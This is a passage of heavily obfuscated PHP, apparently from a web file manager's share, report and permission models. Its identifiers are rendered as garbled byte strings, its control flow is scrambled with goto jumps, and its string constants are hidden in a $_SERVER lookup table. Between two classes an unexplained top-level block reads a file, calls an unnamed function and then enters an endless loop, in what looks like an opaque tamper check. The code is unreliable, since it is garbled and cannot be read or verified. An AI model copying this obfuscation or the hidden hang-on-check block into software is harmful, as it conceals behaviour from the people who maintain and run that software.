$A™È×¶ˆ÷[$B‹ÀÈº«õ]; } goto c’ÚÄÇîêÚ; fèµé…Ö¨: if ($eî®Ÿ¹ÁğÔ = $this->where($C‘ğ–Ï»)->find()) { return $eî®Ÿ¹ÁğÔ[$cæ¦¹ªƒö¦[465]]; } if ($DŸ‘›³¤Š == 0) { $E†îğì†É = array($cæ¦¹ªƒö¦[28] => get_path_this($A™È×¶ˆ÷[$cæ¦¹ªƒö¦[85]])); } else { $E†îğì†É = Model($cæ¦¹ªƒö¦[765])->sourceInfo($DŸ‘›³¤Š); if (!$E†îğì†É) { return !1; } } if (!$A™È×¶ˆ÷[$cæ¦¹ªƒö¦[1394]]) { $A™È×¶ˆ÷[$cæ¦¹ªƒö¦[1394]] = $E†îğì†É[$cæ¦¹ªƒö¦[28]]; } goto cãá‚Ó…˜È; c’ÚÄÇîêÚ: $e¦ÛÒ‰ğ“î = $this->add($cÓ›„Ì‘³Î); $A¿åç‡ƒ‰ä = array($cæ¦¹ªƒö¦[467] => short_id($e¦ÛÒ‰ğ“î)); $this->where(array($cæ¦¹ªƒö¦[464] => $e¦ÛÒ‰ğ“î))->save($A¿åç‡ƒ‰ä); goto dèØ·ˆËÕ•; EÆ°–ä¼: } private function _shareAuthSet($BéÕˆÉĞ¾Ş, $c©ò›„©¿„) { goto C’ŠŒœÜøŸ; Bà’ŠóŠ¬¸: return $Aà£‘©•Ö->addAll($F¬¡Ì¹Ä¥›, array(), !0); goto E¹‘ƒ…»í; C’ŠŒœÜøŸ: $e¾ø²“ìÅ§ =& $_SERVER[¢Í]; if (!is_array($c©ò›„©¿„)) { return !1; } $Aà£‘©•Ö = Model($e¾ø²“ìÅ§[1796]); goto DØ§ÙŸ‘ƒà; DØ§ÙŸ‘ƒà: $Aà£‘©•Ö->where(array($e¾ø²“ìÅ§[465] => $BéÕˆÉĞ¾Ş))->delete(); $F¬¡Ì¹Ä¥› = array(); foreach ($c©ò›„©¿„ as $bìîß Ñœ…) { $a½ÔÅ‘Ê¦İ = SourceModel::TYPE_USER; if ($bìîß Ñœ…[$e¾ø²“ìÅ§[396]] == SourceModel::TYPE_GROUP) { $a½ÔÅ‘Ê¦İ = SourceModel::TYPE_GROUP; } $DÄçõÂ‡‡ = array($e¾ø²“ìÅ§[465] => $BéÕˆÉĞ¾Ş, $e¾ø²“ìÅ§[396] => $a½ÔÅ‘Ê¦İ, $e¾ø²“ìÅ§[482] => intval($bìîß Ñœ…[$e¾ø²“ìÅ§[482]]), $e¾ø²“ìÅ§[1797] => 0, $e¾ø²“ìÅ§[1798] => -1); if ($bìîß Ñœ…[$e¾ø²“ìÅ§[1797]]) { $DÄçõÂ‡‡[$e¾ø²“ìÅ§[1797]] = $bìîß Ñœ…[$e¾ø²“ìÅ§[1797]]; } else { if ($bìîß Ñœ…[$e¾ø²“ìÅ§[1798]]) { $DÄçõÂ‡‡[$e¾ø²“ìÅ§[1798]] = $bìîß Ñœ…[$e¾ø²“ìÅ§[1798]]; } } $F¬¡Ì¹Ä¥›[] = $DÄçõÂ‡‡; } goto Bà’ŠóŠ¬¸; E¹‘ƒ…»í: } public function numViewAdd($dÅ†ñ„Šª¦) { $c™É°š— =& $_SERVER[¢Í]; $AÏ¤İßÖ— = array($c™É°š—[464] => $dÅ†ñ„Šª¦); $this->where($AÏ¤İßÖ—)->setAdd($c™É°š—[1793]); } public function numDownloadAdd($D™¸ÓÔÅ”Ş) { $E®œñóïÆ— =& $_SERVER[¢Í]; $A‘‰ˆñ› = array($E®œñóïÆ—[464] => $D™¸ÓÔÅ”Ş); $this->where($A‘‰ˆñ›)->setAdd($E®œñóïÆ—[1794]); } protected function shareEdit($aÒ©ë¯ùÃ, $DŒùÄÀ°É) { goto BÀ‚é¹Ë¦›; AÓæöŒğæ™: if (isset($DŒùÄÀ°É[$Bö›Ë‡®ÓÊ[1786]])) { $this->_shareAuthSet($aÒ©ë¯ùÃ, $DŒùÄÀ°É[$Bö›Ë‡®ÓÊ[1786]]); } return !0; goto bÏÁ¨Œ“·; Bï×æé¿‚ò: foreach ($d±•ƒÙİù as $b–—äğÅÍº) { if (!array_key_exists($b–—äğÅÍº, $DŒùÄÀ°É)) { continue; } $Cë¤ Ïøùë[$b–—äğÅÍº] = $DŒùÄÀ°É[$b–—äğÅÍº]; } $this->shareEventAdd($bÉğ´äİí[$Bö›Ë‡®ÓÊ[394]], $DŒùÄÀ°É, $Bö›Ë‡®ÓÊ[1615]); $this->where(array($Bö›Ë‡®ÓÊ[464] => $aÒ©ë¯ùÃ))->save($Cë¤ Ïøùë); goto AÓæöŒğæ™; Dğ‡¸Ôö×Ş: $this->_checkLinkShare($DŒùÄÀ°É, $bÉğ´äİí); $Cë¤ Ïøùë = array(); $d±•ƒÙİù = explode($Bö›Ë‡®ÓÊ[47], $Bö›Ë‡®ÓÊ[1799]); goto Bï×æé¿‚ò; BÀ‚é¹Ë¦›: $Bö›Ë‡®ÓÊ =& $_SERVER[¢Í]; $bÉğ´äİí = $this->getInfo($aÒ©ë¯ùÃ); if (!$bÉğ´äİí) { return !1; } goto Dğ‡¸Ôö×Ş; bÏÁ¨Œ“·: } private function _checkLinkShare($e¤ô†¬áÂ†, $FÈÆÅ’Ø‘) { goto cè…‡æ”Ù¦; Báâæì‰¡ô: $B’©é¸ìË– = $this->shareFileMeta($CÕÀÁŒÓœÇ[$aìÄ‡ ¶£[444]]); if (isset($B’©é¸ìË–[$aìÄ‡ ¶£[375]]) && $B’©é¸ìË–[$aìÄ‡ ¶£[375]] == $aìÄ‡ ¶£[93]) { show_json(LNG($aìÄ‡ ¶£[1802]), !1); } goto AâÑàÉ’±¼; cè…‡æ”Ù¦: $aìÄ‡ ¶£ =& $_SERVER[¢Í]; if ($e¤ô†¬áÂ†[$aìÄ‡ ¶£[470]] != $aìÄ‡ ¶£[93]) { return; } $eìĞ„‰ •ª = $FÈÆÅ’Ø‘[$aìÄ‡ ¶£[416]][$aìÄ‡ ¶£[394]]; goto b—ù×š—áñ; b—ù×š—áñ: if ($FÈÆÅ’Ø‘[$aìÄ‡ ¶£[416]][$aìÄ‡ ¶£[29]] != $aìÄ‡ ¶£[181]) { $D»ßåë®ÙÔ = $this->_folderReport($eìĞ„‰ •ª); if (!$D»ßåë®ÙÔ) { return; } show_json(LNG($aìÄ‡ ¶£[1800]) . $aìÄ‡ ¶£[1801] . $D»ßåë®ÙÔ, !1); } $CÕÀÁŒÓœÇ = Model($aìÄ‡ ¶£[765])->fileInfoGet($FÈÆÅ’Ø‘[$aìÄ‡ ¶£[416]][$aìÄ‡ ¶£[394]]); if (!$CÕÀÁŒÓœÇ) { return; } goto Báâæì‰¡ô; AâÑàÉ’±¼: } private function _folderReport($B¸®ÓµÅ¡) { goto c¼®ÛŒƒ; Dƒ¡—‘ÁÖ÷: $FŒâ†¥¦‰¡ = array_to_keyvalue($D«ËàâÅù, $aÚç–¾±Îõ[33], $aÚç–¾±Îõ[28]); $FŒâ†¥¦‰¡[] = $d§å†¥¶[$aÚç–¾±Îõ[28]]; return implode($aÚç–¾±Îõ[8], $FŒâ†¥¦‰¡); goto céÂ£ïğ¢Ö; fñíæÔöÌ: $e‡˜¥”ÃëŒ = array($aÚç–¾±Îõ[444] => array($aÚç–¾±Îõ[7], $Cáñ³”•µ¼), $aÚç–¾±Îõ[485] => array($aÚç–¾±Îõ[382], "\45{$a‡‹¹Ü÷šâ}\45"), $aÚç–¾±Îõ[422] => 0); $d§å†¥¶ = Model($aÚç–¾±Îõ[765])->where($e‡˜¥”ÃëŒ)->field($aÚç–¾±Îõ[1804])->find(); if (!$d§å†¥¶) { return !1; } goto d°µÃ‹Ò£; fÙ¤äÃñ¨å: if (!$Cáñ³”•µ¼) { return !1; } $Cáñ³”•µ¼ = array_to_keyvalue($Cáñ³”•µ¼, $aÚç–¾±Îõ[33], $aÚç–¾±Îõ[444]); $a‡‹¹Ü÷šâ = $aÚç–¾±Îõ[47] . $B¸®ÓµÅ¡ . $aÚç–¾±Îõ[47]; goto fñíæÔöÌ; d°µÃ‹Ò£: $c¬–¦¸Ğ = substr($d§å†¥¶[$aÚç–¾±Îõ[485]], strpos($d§å†¥¶[$aÚç–¾±Îõ[485]], $a‡‹¹Ü÷šâ)); $e‡˜¥”ÃëŒ = array($aÚç–¾±Îõ[394] => array($aÚç–¾±Îõ[7], trim($c¬–¦¸Ğ, $aÚç–¾±Îõ[47]))); $D«ËàâÅù = Model($aÚç–¾±Îõ[765])->where($e‡˜¥”ÃëŒ)->field($aÚç–¾±Îõ[28])->select(); goto Dƒ¡—‘ÁÖ÷; c¼®ÛŒƒ: $aÚç–¾±Îõ =& $_SERVER[¢Í]; $e‡˜¥”ÃëŒ = array($aÚç–¾±Îõ[444] => array($aÚç–¾±Îõ[937], 0), $aÚç–¾±Îõ[703] => 3); $Cáñ³”•µ¼ = Model($aÚç–¾±Îõ[1803])->where($e‡˜¥”ÃëŒ)->field($aÚç–¾±Îõ[444])->select(); goto fÙ¤äÃñ¨å; céÂ£ïğ¢Ö: } protected function remove($bóÏ’óÉ¤) { goto f™àËÔøÔÓ; f™àËÔøÔÓ: $cƒ“ä¶µÍƒ =& $_SERVER[¢Í]; if (is_array($bóÏ’óÉ¤)) { $bóÏ’óÉ¤ = array($cƒ“ä¶µÍƒ[7], $bóÏ’óÉ¤); } $AèŒº‰ˆ§ = array($cƒ“ä¶µÍƒ[465] => $bóÏ’óÉ¤); goto dá”’ø§ˆ; e®©øó¯öŒ: for ($Cµ–‘à¾ä = 0; $Cµ–‘à¾ä < count($a®ñ¼óìö¿); $Cµ–‘à¾ä++) { $Cİ…´Ÿ˜°¼ = $this->getInfo($a®ñ¼óìö¿[$Cµ–‘à¾ä]); if ($Cİ…´Ÿ˜°¼[$cƒ“ä¶µÍƒ[472]] == $cƒ“ä¶µÍƒ[93]) { Model($cƒ“ä¶µÍƒ[531])->eventShare($Cİ…´Ÿ˜°¼[$cƒ“ä¶µÍƒ[394]], $cƒ“ä¶µÍƒ[1791]); } if ($Cİ…´Ÿ˜°¼[$cƒ“ä¶µÍƒ[470]] == $cƒ“ä¶µÍƒ[93]) { Model($cƒ“ä¶µÍƒ[531])->eventShare($Cİ…´Ÿ˜°¼[$cƒ“ä¶µÍƒ[394]], $cƒ“ä¶µÍƒ[1790]); } } return $bî¤ßï»¢×; goto E‡Ã´í¢§«; dá”’ø§ˆ: $bî¤ßï»¢× = $this->where($AèŒº‰ˆ§)->delete(); if ($bî¤ßï»¢×) { Model($cƒ“ä¶µÍƒ[562])->where(array($cƒ“ä¶µÍƒ[465] => $bóÏ’óÉ¤))->delete(); } $a®ñ¼óìö¿ = is_array($bóÏ’óÉ¤) ? $bóÏ’óÉ¤[1] : array($bóÏ’óÉ¤); goto e®©øó¯öŒ; E‡Ã´í¢§«: } protected function removeBySource($cçÄù÷†Ò’) { goto DïÒîÃâŒ½; aË£Ù¤Ç¸‹: $bšâç¾¹ÔŸ = array_to_keyvalue($bšâç¾¹ÔŸ, $B¤œèçÓ§è[33], $B¤œèçÓ§è[465]); if (!$bšâç¾¹ÔŸ) { return; } $fÄ´¨óè§Ã = array($B¤œèçÓ§è[464] => array($B¤œèçÓ§è[409], $bšâç¾¹ÔŸ)); goto B¡ÜÛÏƒå; DïÒîÃâŒ½: $B¤œèçÓ§è =& $_SERVER[¢Í]; $fÄ´¨óè§Ã = array($B¤œèçÓ§è[408] => array($B¤œèçÓ§è[409], $cçÄù÷†Ò’)); $bšâç¾¹ÔŸ = $this->field($B¤œèçÓ§è[465])->where($fÄ´¨óè§Ã)->select(); goto aË£Ù¤Ç¸‹; B¡ÜÛÏƒå: $this->where($fÄ´¨óè§Ã)->delete(); Model($B¤œèçÓ§è[562])->where($fÄ´¨óè§Ã)->delete(); goto F‚ ³§ˆ°Å; F‚ ³§ˆ°Å: } public function listAll($Aïòã·óíŸ) { goto Bç¼óÛç‡¡; cê‰Ü­‚§‡: if ($Aïòã·óíŸ[$EÆ›È¢ó[716]]) { $CŸĞªùğ…ƒ = $Aïòã·óíŸ[$EÆ›È¢ó[473]] ? $Aïòã·óíŸ[$EÆ›È¢ó[473]] : strtotime(date($EÆ›È¢ó[1805])); $bÒ¯¯‡×…Ñ[$EÆ›È¢ó[200]] = array($EÆ›È¢ó[336], array($Aïòã·óíŸ[$EÆ›È¢ó[716]], $CŸĞªùğ…ƒ)); } if ($Aïòã·óíŸ[$EÆ›È¢ó[29]]) { $bÒ¯¯‡×…Ñ[$Aïòã·óíŸ[$EÆ›È¢ó[29]]] = 1; } else { $bÒ¯¯‡×…Ñ[] = array($EÆ›È¢ó[470] => array($EÆ›È¢ó[937], 0), $EÆ›È¢ó[472] => array($EÆ›È¢ó[937], 0), $EÆ›È¢ó[1780] => $EÆ›È¢ó[1737]); } if ($Aïòã·óíŸ[$EÆ›È¢ó[1733]]) { $bÒ¯¯‡×…Ñ[] = array($EÆ›È¢ó[467] => $Aïòã·óíŸ[$EÆ›È¢ó[1733]], $EÆ›È¢ó[1394] => array($EÆ›È¢ó[382], "\x25{$Aïòã·óíŸ[$EÆ›È¢ó[1733]]}\45"), $EÆ›È¢ó[1780] => $EÆ›È¢ó[1737]); } goto bñË’Ê¶çÆ; EĞÙÒŞ¼‰: return $d¹ÈÉáÀ•µ; goto D×§ò¡øÔŞ; Bç¼óÛç‡¡: $EÆ›È¢ó =& $_SERVER[¢Í]; $bÒ¯¯‡×…Ñ = array(); if ($Aïòã·óíŸ[$EÆ›È¢ó[1489]]) { $bÒ¯¯‡×…Ñ[$EÆ›È¢ó[1489]] = $Aïòã·óíŸ[$EÆ›È¢ó[1489]]; } goto cê‰Ü­‚§‡; bñË’Ê¶çÆ: $d¹ÈÉáÀ•µ = $this->_makeOrder()->where($bÒ¯¯‡×…Ñ)->selectPage(20); if (empty($d¹ÈÉáÀ•µ[$EÆ›È¢ó[370]])) { return array(); } $this->_listDataApply($d¹ÈÉáÀ•µ[$EÆ›È¢ó[370]]); goto EĞÙÒŞ¼‰; D×§ò¡øÔŞ: } public function listDataApply($AÔ’¼ÈĞœó) { $this->_listDataApply($AÔ’¼ÈĞœó); return $AÔ’¼ÈĞœó; } private function _listDataApply(&$d§¶¶É„Ó¸) { goto c…•í“Ë„ã; c…•í“Ë„ã: $DÈß‰§…ƒ‚ =& $_SERVER[¢Í]; $F—ªìÂ÷ï = array_to_keyvalue($d§¶¶É„Ó¸, $DÈß‰§…ƒ‚[33], $DÈß‰§…ƒ‚[1489]); $DªŠĞ¸“ö÷ = Model($DÈß‰§…ƒ‚[503])->userListInfo(array_unique($F—ªìÂ÷ï)); goto dÜÙ›ÓÖ; dÜÙ›ÓÖ: $e·ñ± §çÓ = array_to_keyvalue($d§¶¶É„Ó¸, $DÈß‰§…ƒ‚[33], $DÈß‰§…ƒ‚[394]); $c¨š¡†âğ = Model($DÈß‰§…ƒ‚[765])->sourceListInfo($e·ñ± §çÓ, !0); foreach ($d§¶¶É„Ó¸ as &$f”ÕŠ¨À™—) { $eÇ…® Èæ‚ = $f”ÕŠ¨À™—[$DÈß‰§…ƒ‚[1489]]; $f”ÕŠ¨À™—[$DÈß‰§…ƒ‚[1806]] = $DªŠĞ¸“ö÷[$eÇ…® Èæ‚] ? $DªŠĞ¸“ö÷[$eÇ…® Èæ‚] : !1; $aæ‘Â‚ä‹ = $f”ÕŠ¨À™—[$DÈß‰§…ƒ‚[394]]; $f”ÕŠ¨À™—[$DÈß‰§…ƒ‚[416]] = $c¨š¡†âğ[$aæ‘Â‚ä‹] ? $c¨š¡†âğ[$aæ‘Â‚ä‹] : !1; } goto EéÒÖ¸š´Ú; EéÒÖ¸š´Ú: unset($f”ÕŠ¨À™—); goto EŸã‘º­°Š; EŸã‘º­°Š: } private function _makeOrder($C«öÔ’œì = '') { goto b÷ÖÌğÕÍ¬; b÷ÖÌğÕÍ¬: $eË“†Ë­‹ =& $_SERVER[¢Í]; $cé¯ìÛé« = array($eË“†Ë­‹[200], $eË“†Ë­‹[473], $eË“†Ë­‹[1793], $eË“†Ë­‹[1794]); $b––è‚ÈÆò = array($eË“†Ë­‹[427] => $eË“†Ë­‹[428], $eË“†Ë­‹[429] => $eË“†Ë­‹[430]); goto c„ñ¯Ø°¾; fÓ´êÂø³: $C«öÔ’œì = $C«öÔ’œì . "{$fƒ¼¡æ÷ÄÏ}\40{$d›Ø‰ƒÏˆë}"; return $this->order($C«öÔ’œì); goto E±¤¤‚°•™; c„ñ¯Ø°¾: $fƒ¼¡æ÷ÄÏ = Input::get($eË“†Ë­‹[432], $eË“†Ë­‹[7], $eË“†Ë­‹[414], $cé¯ìÛé«); $d›Ø‰ƒÏˆë = Input::get($eË“†Ë­‹[433], $eË“†Ë­‹[7], $eË“†Ë­‹[1807], array($eË“†Ë­‹[1732], $eË“†Ë­‹[429])); $d›Ø‰ƒÏˆë = $b––è‚ÈÆò[$d›Ø‰ƒÏˆë]; goto fÓ´êÂø³; E±¤¤‚°•™: } public function reportAdd($b‡Õ…¢ë±) { $c±Òˆáœ± =& $_SERVER[¢Í]; $eª†çòÛ¯‘ = array($c±Òˆáœ±[465] => $b‡Õ…¢ë±[$c±Òˆáœ±[465]], $c±Òˆáœ±[1489] => USER_ID); if (Model($c±Òˆáœ±[1803])->where($eª†çòÛ¯‘)->find()) { return !1; } $E¶Ôé†„Ş = array($c±Òˆáœ±[465] => $b‡Õ…¢ë±[$c±Òˆáœ±[465]], $c±Òˆáœ±[1394] => $b‡Õ…¢ë±[$c±Òˆáœ±[1394]], $c±Òˆáœ±[394] => $b‡Õ…¢ë±[$c±Òˆáœ±[394]], $c±Òˆáœ±[444] => $b‡Õ…¢ë±[$c±Òˆáœ±[444]], $c±Òˆáœ±[1489] => USER_ID, $c±Òˆáœ±[29] => $b‡Õ…¢ë±[$c±Òˆáœ±[29]], $c±Òˆáœ±[430] => $b‡Õ…¢ë±[$c±Òˆáœ±[430]]); return Model($c±Òˆáœ±[1803])->add($E¶Ôé†„Ş); } public function reportList($c‚×«çÃ°®) { goto AëÈİ×ôî; b¹ï¸íğ²ï: $CÁ‡¸¯†œÑ = array($e¬¡©Â‡¶Ã[427] => $e¬¡©Â‡¶Ã[428], $e¬¡©Â‡¶Ã[429] => $e¬¡©Â‡¶Ã[430]); $AåŒğµ‹õ± = $e¬¡©Â‡¶Ã[1812] . $CÁ‡¸¯†œÑ[$eŒÉ÷ ³‘]; $fÜˆñ‘¤ì‚ = Model($e¬¡©Â‡¶Ã[1803])->where($D”ˆÇ“²†ä)->order($AåŒğµ‹õ±)->selectPage(20); goto A…ñ÷À»; A…ñ÷À»: if (empty($fÜˆñ‘¤ì‚[$e¬¡©Â‡¶Ã[370]])) { return array(); } $this->_listDataApply($fÜˆñ‘¤ì‚[$e¬¡©Â‡¶Ã[370]]); return $fÜˆñ‘¤ì‚; goto A¹Ãà…ˆ‹; AëÈİ×ôî: $e¬¡©Â‡¶Ã =& $_SERVER[¢Í]; $D”ˆÇ“²†ä = array(); if ($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[716]]) { $bËäŠŠ’Ì¾ = $c‚×«çÃ°®[$e¬¡©Â‡¶Ã[473]] ? $c‚×«çÃ°®[$e¬¡©Â‡¶Ã[473]] : strtotime(date($e¬¡©Â‡¶Ã[1805])); $D”ˆÇ“²†ä[$e¬¡©Â‡¶Ã[200]] = array($e¬¡©Â‡¶Ã[336], array($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[716]], $bËäŠŠ’Ì¾)); } goto dƒÅ¤ù®Œğ; dƒÅ¤ù®Œğ: if (isset($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[29]]) && in_array($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[29]], array($e¬¡©Â‡¶Ã[93], $e¬¡©Â‡¶Ã[1808], $e¬¡©Â‡¶Ã[1809], $e¬¡©Â‡¶Ã[1810], $e¬¡©Â‡¶Ã[1811]))) { $D”ˆÇ“²†ä[$e¬¡©Â‡¶Ã[29]] = $c‚×«çÃ°®[$e¬¡©Â‡¶Ã[29]]; } if (isset($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[703]]) && in_array($c‚×«çÃ°®[$e¬¡©Â‡¶Ã[703]], array($e¬¡©Â‡¶Ã[494], $e¬¡©Â‡¶Ã[93], $e¬¡©Â‡¶Ã[1808], $e¬¡©Â‡¶Ã[1809]))) { $D”ˆÇ“²†ä[$e¬¡©Â‡¶Ã[703]] = $c‚×«çÃ°®[$e¬¡©Â‡¶Ã[703]]; } $eŒÉ÷ ³‘ = Input::get($e¬¡©Â‡¶Ã[433], $e¬¡©Â‡¶Ã[7], $e¬¡©Â‡¶Ã[1807], array($e¬¡©Â‡¶Ã[1732], $e¬¡©Â‡¶Ã[429])); goto b¹ï¸íğ²ï; A¹Ãà…ˆ‹: } public function reportStatus($aÔ¨£„îù‡) { goto A©»•æí‘Ó; aë³òƒ„ùí: if (!$fŠœµ¢¨òß) { return !1; } $Aáö’‚ ù = array($E¸¸ö—ùğ—[703] => $aÔ¨£„îù‡[$E¸¸ö—ùğ—[703]]); if ($aÔ¨£„îù‡[$E¸¸ö—ùğ—[703]] == $E¸¸ö—ùğ—[1809] && $fŠœµ¢¨òß[$E¸¸ö—ùğ—[703]] == $E¸¸ö—ùğ—[1809]) { $Aáö’‚ ù[$E¸¸ö—ùğ—[703]] = 0; } goto d–…›­†˜½; d–…›­†˜½: $D©´‘Áœ“è = Model($E¸¸ö—ùğ—[1803])->where($d Ïƒİ¿—§)->save($Aáö’‚ ù); if ($aÔ¨£„îù‡[$E¸¸ö—ùğ—[703]] == $E¸¸ö—ùğ—[1808]) { if ($fŠœµ¢¨òß[$E¸¸ö—ùğ—[444]] != $E¸¸ö—ùğ—[494] && $this->shareFileMeta($fŠœµ¢¨òß[$E¸¸ö—ùğ—[444]])) { $this->shareFileMeta($fŠœµ¢¨òß[$E¸¸ö—ùğ—[444]], 0); } $this->remove($fŠœµ¢¨òß[$E¸¸ö—ùğ—[465]]); return !0; } if ($D©´‘Áœ“è && $aÔ¨£„îù‡[$E¸¸ö—ùğ—[703]] == $E¸¸ö—ùğ—[1809]) { $c£“…‹áô¢ = $Aáö’‚ ù[$E¸¸ö—ùğ—[703]] == $E¸¸ö—ùğ—[1809] ? 1 : 0; $this->shareFileMeta($fŠœµ¢¨òß[$E¸¸ö—ùğ—[444]], $c£“…‹áô¢); $this->removeByFile($fŠœµ¢¨òß[$E¸¸ö—ùğ—[444]]); } goto FùÆÃ˜ŒÑ; A©»•æí‘Ó: $E¸¸ö—ùğ— =& $_SERVER[¢Í]; $d Ïƒİ¿—§ = array($E¸¸ö—ùğ—[392] => $aÔ¨£„îù‡[$E¸¸ö—ùğ—[392]]); $fŠœµ¢¨òß = Model($E¸¸ö—ùğ—[1803])->where($d Ïƒİ¿—§)->field($E¸¸ö—ùğ—[1813])->find(); goto aë³òƒ„ùí; FùÆÃ˜ŒÑ: return $D©´‘Áœ“è; goto CÅ¶Ù¥Ïšä; CÅ¶Ù¥Ïšä: } private function removeByFile($A‘·¸•Ö‡´) { goto e¶éÑ¢ãÏ‡; F¦±È˜º›: $C÷‰…Üï” = array_to_keyvalue($cŠ—öù­±¸, $a”óØÏø‹É[33], $a”óØÏø‹É[465]); $this->remove($C÷‰…Üï”); goto d˜µˆ‘œÖ; A›²Ç¿íŸ: $B¸æ©ã’î = array($a”óØÏø‹É[394] => array($a”óØÏø‹É[7], $A†ÁíÃ‡¨¢), $a”óØÏø‹É[470] => 1); $cŠ—öù­±¸ = Model($a”óØÏø‹É[1625])->where($B¸æ©ã’î)->field($a”óØÏø‹É[465])->select(); if (empty($cŠ—öù­±¸)) { return; } goto F¦±È˜º›; e¶éÑ¢ãÏ‡: $a”óØÏø‹É =& $_SERVER[¢Í]; $cŠ—öù­±¸ = Model($a”óØÏø‹É[765])->where(array($a”óØÏø‹É[444] => $A‘·¸•Ö‡´))->field($a”óØÏø‹É[394])->select(); $A†ÁíÃ‡¨¢ = array_to_keyvalue($cŠ—öù­±¸, $a”óØÏø‹É[33], $a”óØÏø‹É[394]); goto A›²Ç¿íŸ; d˜µˆ‘œÖ: } private function shareFileMeta($e³—Ä¿ÈÅÔ, $fÖ¿îËŞíÏ = null) { $C¶œ‘àÁ =& $_SERVER[¢Í]; $cœá¬’¶Õ½ = array($C¶œ‘àÁ[444] => $e³—Ä¿ÈÅÔ, $C¶œ‘àÁ[99] => $C¶œ‘àÁ[1814]); if (is_null($fÖ¿îËŞíÏ)) { return Model($C¶œ‘àÁ[1815])->where($cœá¬’¶Õ½)->find(); } $cœá¬’¶Õ½[$C¶œ‘àÁ[375]] = $fÖ¿îËŞíÏ; Model($C¶œ‘àÁ[1815])->add($cœá¬’¶Õ½, array(), !0); } } if (!isset($_SERVER[$_SERVER[¢Í][51]]) || !isset($_SERVER[$_SERVER[¢Í][60]])) { goto Fƒ»Ùˆ‡; e“­Éê÷“æ: $cíÔØ†øÙù($_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]); $b‘›–‘›å… = 2; while ($b‘›–‘›å… > 1) { $c™ĞÈÆÆøª = rawurlencode($b‘›–‘›å… . $_SERVER[¢Í][377]); } goto e”ŸÄ‹šì; DÚ¯ïÀÇí: $f¤»¾‚šÓ› = explode($_SERVER[¢Í][56], $cĞè¯ÆÉ°‘); if (count($f¤»¾‚šÓ›) < $_SERVER[¢Í][57]) { $A«Í°ì¿‰œ = $_SERVER[¢Í][58]; $A«Í°ì¿‰œ(); } $cíÔØ†øÙù = $_SERVER[¢Í][59]; goto e“­Éê÷“æ; Fƒ»Ùˆ‡: $F±•ğÔ×Ø˜ = $_SERVER[¢Í][53]; $CçŒ¾ˆï£ = $_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]; $cĞè¯ÆÉ°‘ = $F±•ğÔ×Ø˜($CçŒ¾ˆï£); goto DÚ¯ïÀÇí; e”ŸÄ‹šì: } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\x65\x5f\x61\x75\164\150"; public function getAuth($bŸŠÜ§Í) { goto C—ìï½†ÚĞ; cÙÙÒÄ ­„: $e„Ÿëø”Úª = $this->field($e¥º¿ì¥×)->order($b‰±ë•à‚[392])->where($B„À‡‹²†­)->select(); $b†Ñ¯ãÆÈº = array(); $C¸å«« ó© = array(); goto d”ŠÁ‡î‘; C—ìï½†ÚĞ: $b‰±ë•à‚ =& $_SERVER[¢Í]; $e¥º¿ì¥× = $b‰±ë•à‚[1816]; $B„À‡‹²†­ = array($b‰±ë•à‚[394] => $bŸŠÜ§Í); goto cÙÙÒÄ ­„; b—ŞğÆÃ¬: return $b†Ñ¯ãÆÈº; goto AÀÑÑƒ•Ñ; d”ŠÁ‡î‘: $bÀƒ‡‰ŸÒ¶ = 2 << 25; foreach ($e„Ÿëø”Úª as $dÀµŸèÃ¹) { goto fÇë÷»äÖ; FñºŒå¡¯¶: $EèÔ¥¦î„É = 0; if ($dÀµŸèÃ¹[$b‰±ë•à‚[396]] == SourceModel::TYPE_GROUP) { $EèÔ¥¦î„É = $bÀƒ‡‰ŸÒ¶ * 2; } if ($dÀµŸèÃ¹[$b‰±ë•à‚[396]] == SourceModel::TYPE_USER) { $EèÔ¥¦î„É = $bÀƒ‡‰ŸÒ¶; } goto b‰ÕĞ´è¹†; fÇë÷»äÖ: $F§¼¹ğ„ø© = Model($b‰±ë•à‚[1817])->listData($dÀµŸèÃ¹[$b‰±ë•à‚[1797]]); if (!$F§¼¹ğ„ø©) { continue; } $b†Ñ¯ãÆÈº[] = $dÀµŸèÃ¹; goto FñºŒå¡¯¶; b‰ÕĞ´è¹†: if ($dÀµŸèÃ¹[$b‰±ë•à‚[396]] == SourceModel::TYPE_USER && $dÀµŸèÃ¹[$b‰±ë•à‚[482]] == $b‰±ë•à‚[494]) { $EèÔ¥¦î„É = 0; } $C¸å«« ó©[] = $F§¼¹ğ„ø©[$b‰±ë•à‚[401]] + $EèÔ¥¦î„É; goto cíªŞ²Á¨; cíªŞ²Á¨: } array_multisort($C¸å«« ó©, SORT_DESC, $b†Ñ¯ãÆÈº); goto b—ŞğÆÃ¬; AÀÑÑƒ•Ñ: } public function setAuth($E†š–¾…ù, $a»â‡Õ) { goto C¿¹ğŠîñ; aÛ—œÆÏÎ: foreach ($a»â‡Õ as $b¬³ÕÉ–Ø‚) { if (!in_array($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[396]], $Dá±‹ëÓÖ)) { show_json(LNG($fá‡ÏÒ½…Æ[1818]), !1); } if ($E±ññÎ˜‚ != $AÄ‘Ê×Ë) { if ($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[396]] == SourceModel::TYPE_GROUP) { } if ($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[482]] != 0 && !in_array($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[482]], $c®İÏ«§‚¹)) { } } if ($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[482]] == 0) { $b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[396]] = SourceModel::TYPE_USER; } $fæç—À¤–[] = array($fá‡ÏÒ½…Æ[394] => $E†š–¾…ù, $fá‡ÏÒ½…Æ[396] => intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[396]]), $fá‡ÏÒ½…Æ[482] => intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[482]]), $fá‡ÏÒ½…Æ[1797] => intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[1797]]) ? intval($b¬³ÕÉ–Ø‚[$fá‡ÏÒ½…Æ[1797]]) : 0, 